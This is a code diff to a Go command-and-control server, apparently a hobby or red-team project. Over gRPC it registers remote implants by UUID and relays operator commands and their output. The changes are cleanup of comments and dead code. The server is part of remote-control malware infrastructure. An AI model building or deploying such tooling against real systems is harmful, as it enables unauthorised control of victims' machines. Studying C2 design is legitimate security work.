@@ -67,8 +67,6 @@ func (s *implantServer) SendCommand(ctx context.Context, implant_uuid *grpcapi.R
 	case cmd, ok := <-s.work: //check the channel
 		if cmd.Uuid == req_uuid { //check if your uuid is the needed one
 			if ok {
-				//fmt.Println("[+] CMD: ", cmd)
-				//fmt.Println("[+] CMD UUID: ", cmd.Uuid)
 				//if so, take the job
 				return cmd, nil
 			}
@@ -105,13 +103,10 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 	if key {
 		//functionality for targeted implant bahaviour
 		go func() {
-			implant_map[uuidstr].work <- cmd //used to be s not implant
-			//grab from the implant_map data structure
-			//implant_map[uuidstr].work <- cmd
+			implant_map[uuidstr].work <- cmd //used to be s not implant_map
 		}()
 		//assign command output to result, ie telling us if it ran properly.
 		res = <-implant_map[uuidstr].output //used to be s not implant
-		//res = <-implant_map[uuidstr].output
 	} else {
 		fmt.Println("[-] UUID was not found/not supplied.")
 	}
@@ -119,13 +114,11 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 	return res, nil
 }
 
-// handle UUID
+// handle UUID registration; very simple as of now.
 func (s *implantServer) RegisterNewImplant(ctx context.Context, uuid_result *grpcapi.Registration) (*grpcapi.Empty, error) {
 	uuidstr := uuid_result.GetUuid()
 	fmt.Println("[+] Recieved new registration request", uuidstr)
-	//add uuid to the list that we have.
-	//uuid_list = append(uuid_list, uuidstr)
-	s.uuid = uuidstr //IDK if this is needed.
+	//s.uuid = uuidstr //IDK if this is needed.
 	//first, check if key is in the map
 	_, key := implant_map[uuidstr]
 	if !key {
@@ -188,8 +181,6 @@ func main() {
 	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 	//use goroutines to serve/instantiate implants
 	go func() {
-		//work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
-		//implant_work = make(chan *grpcapi.Command)
 		//instantiate a new implant to act as a device client and an admin server. We're doing this on the same channel, so IPC between them is shared on the same goroutine.
 		implant := NewImplantServer(work, output)
 		//use "tcp4/" to bind ONLY to ipv4, jsut "tcp" will bind to ipv6 OR ipv4
@@ -199,11 +190,11 @@ func main() {
 		}
 		grpcImplantServer := grpc.NewServer(opts...)
 		grpcapi.RegisterImplantServer(grpcImplantServer, implant)
-
+		//serve the implant server as its own goroutine
 		grpcImplantServer.Serve(implantListener)
 		fmt.Printf("[+] GOre server has established an implant connection successfully on %s:%d", server_ip, server_port_num)
 	}()
-	//admin server is not multithreaded, only one is allowed. For now.
+	//admin server is not multithreaded, only one expected. For now.
 	grpcAdminServer.Serve(adminListener)
 
 }
